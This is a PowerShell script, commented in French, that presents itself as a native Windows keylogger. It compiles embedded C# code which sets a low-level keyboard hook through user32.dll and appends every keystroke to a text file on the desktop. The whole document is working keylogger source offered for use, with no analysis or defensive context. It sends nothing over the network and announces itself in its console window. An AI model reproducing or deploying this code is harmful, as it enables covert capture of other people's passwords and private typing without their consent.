# -------------------------------------------------------------
# KEYLOGGER NATIF WINDOWS (POWERSHELL)
# SANS AUCUN PREREQUIS EXTERNE (Ni Python, ni Pip)
# -------------------------------------------------------------

# --- CONFIGURATION ---
$LogFile = "$env:USERPROFILE\Desktop\keylog_capture.txt"
$TargetDir = "$env:USERPROFILE\Desktop"

# S'assurer que le dossier existe
if (-not (Test-Path $TargetDir)) {
    New-Item -Path $TargetDir -ItemType Directory | Out-Null
}

# Code C# pour le Hook API Win32
$Source = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;

public class Logger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logPath = "";

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Start(string path) {
        _logPath = path;
        _hookID = SetHook(_proc);
        Application.Run(); // Démarre la boucle de messages Windows
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            
            // Formatage des touches spéciales
            if (key.Length > 1) {
               key = " [" + key + "] ";
            }
            
            try {
                // Écriture immédiate dans le fichier
                using (StreamWriter sw = File.AppendText(_logPath)) {
                    sw.Write(key);
                }
            } catch { }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

# --- Début du Script ---
Write-Host "--- INITIALISATION ---" -ForegroundColor Cyan
Clear-Host
$LogPath = $LogFile

try {
    # Compilation du code C#
    Add-Type -TypeDefinition $Source -ReferencedAssemblies System.Windows.Forms, System.Drawing, System.Runtime.InteropServices, System.Diagnostics
} catch {
    Write-Host "[ERREUR C# FATALE] Le compilateur .NET n'est pas disponible." -ForegroundColor Red
    Read-Host "Appuyez sur Entree pour voir l'erreur..."
    Exit
}

Write-Host "KEYLOGGER NATIF ACTIF" -ForegroundColor Green
Write-Host "Log de sortie : $LogPath"
Write-Host "Ne fermez pas cette fenêtre pour continuer la capture."

# Lancement de la capture
[Logger]::Start($LogPath)

# Empêche la fermeture immédiate après un éventuel crash
Read-Host "Le Keylogger s'est arrêté. Appuyez sur Entree pour quitter."
